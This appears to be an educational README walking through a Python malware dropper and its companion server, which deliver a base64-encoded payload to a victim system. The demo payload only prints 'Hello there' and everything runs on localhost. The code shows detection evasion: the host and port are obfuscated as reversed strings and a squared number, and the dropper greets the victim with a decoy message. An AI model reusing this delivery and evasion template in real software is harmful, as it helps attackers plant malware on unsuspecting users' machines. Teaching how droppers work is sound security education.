# Dropper

Our **dropper** is implemented in the file `dropper.py`. It tries to download some malicious code from a remote server and ideally avoid any detection. The server is implemented in the file `server.py` and sends the malicious payload to the targeted system as soon as the dropper requests a connection. Received payload is dumped into the file and the malware was successfully delivered.

#### Demonstration of behavior

The first thing that the attacker must do is to set up a server that distributes malware to its clients. Therefore, we will set up a running server on our computer by running `./server.py`. You should see the following text:
```
DEBUG:user:Server was successfully initialized.
```
In the second console, execute the **dropper** as a victim with the command `./dropper.py`. We should immediately see the following text on the attacker's console:
```
Connection with dropper established from ('127.0.0.1', 46682)
```
and the server shuts down. This means that our client has successfully connected to our server.

To verify that the dropper has served its purpose, list the directory where the dropper is located and you will see that a new file `malware.py` has been created. For demostration purposes, the "malicious" code is just a simple command to print short text. Execute the file by running `python malware.py`. After doing so, you should see the following text:
```
Hello there
```

Creation of basic **dropper** is very simple process as it is described below and anyone can do it just with the basic knowledge of programming and understandment of operating systems. That's why we should be always cautious when we execute any uncommon or not trusted file.

#### How does it work?

##### Server

- Firstly, we create our **server** that should send malicious code to a running **dropper** client executed
  by the victim. The server will listen on the specific port that must be the same as is the one used by our **dropper**.
  In this example, both the **server** and **dropper** will be executed on the same computer, but the
  **server** might be remote and located anywhere in the world.
  ```python
  server = Server(27000)
  ```
  Communication is realized via **TCP** protocol specified by `socket.SOCK_STREAM` (To learn more about network protocols see [the guide to network communication](https://support.holmsecurity.com/hc/en-us/articles/212963869-What-is-the-difference-between-TCP-and-UDP-). <br>
  ```python
  self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  ```

- Then we need to initialize the server by binding it to the specified port.
  ```python
  server.initialize()
  ```
- We can observe the malicious command that should be send to the dropper. In this case, it's just a simple command to print some text.
  ```python
  @property
  def malware_code(self):
      return b'print("Hello there")'
  ```
- The most important part is the connection with the victim. This is implemented in the _send_malicious_code_  function provided by the **server**. It waits for the connection initiated by the **dropper** after its execution on the victim's system. It then simply sends the payload and terminates the connection.
  ```python
    with connection:
        print('Connection with dropper established from {}'.format(address))
        # Send data to the client and close the server.
        encoded_payload = base64.b64encode(self.malicious_code)
        connection.send(encoded_payload)
  ```
- The first attempt to prevent detection is coming and it's encryption of the malicious code. What if someone sees everything we send over the network? If so, our malicious code might be detected immediately and  communication stopped or the victim will be notified. That's why we use at least some layer of encryption. For demonstration, we can use basic encoding **base64**. To learn more about **base64** see [the guide to base64](https://blogs.oracle.com/rammenon/base64-explained).
  ```python
  encoded_payload = base64.b64encode(self.malicious_code)
  ```

##### Dropper (client)

- Firstly, we must initialize our **dropper**. This service requires a name of the host (server) and the
  specified port for communication. A host named `localhost` means that the server is listening on the same
  system as our client. A second attempt is made to avoid detection. What if someone glanced over the code of our dropper and spots some suspicious address? Or maybe our victim scans the files for possible port numbers and if the number `27000` is displayed, they might suspect something. We have to hide this data somehow, so we pass some innocent looking arguments.

  ```python
  dropper = Dropper('tsoh', 'lacol', 729000000)
  ```
- If someone inspects the code, they can see the methods for network communication. However, based on the arguments passed to our dropper it's not clear with whom and which port will be used (maybe `729000000`?). We can construct the necessary connection attributes dynamically during runtime. Method _decode\_hostname_ takes two strings, switches their order and reserses them. From the first two arguments passed to our dropper we suddenly get the string `localhost`. And to get the port, we can simply calculate the square root from the last argument. Easy to do, but harder to detect.
  ```python
  def decode_hostname(self, str1, str2):
      """ Constructs the hostname of remote server. """
      return str2[::-1] + str1[::-1]

  def decode_port(self, port):
      """Constructs the port of remote server. """
      return int(math.sqrt(port))
  ```

- Now, we try to connect to the server. This connection should remain hidden from the victim. The logged message is presented only so that we can detect any errors in our example.
  ```python
  try:
      self.socket.connect((self.host, self.port))
  except socket.error:
      logging.debug('Dropper could not connect to the server.')
      return
  ```

- Then the **dropper** tries to greet the victim as a harmless program.
   ```python
   # Try to act as an ordinary application.
   print(
       'Hello, this is a totally ordinary app. '
       'I\'m surely not doing anything malicous'
   )
   ```
-  In the meantime, the client will try to receive the malicious code from the remote server. Remember that the data are encrypted using Base64, so we have to decode them and we have successfully downloaded the malware.
   ```python
   # Receive the malicious code in the encrypted form.
   command = self.socket.recv(1000)
   # Decode the malicious payload and dump it into a file.
   decode_payload = base64.b64decode(command)
   ```
- The last thing left is to either execute the retrieved code or simply write it into a file. The payload was successfully delivered to the target system by doing so.
  ```python
  with open('malware.py', 'wb') as file:
      file.write(data)
  ```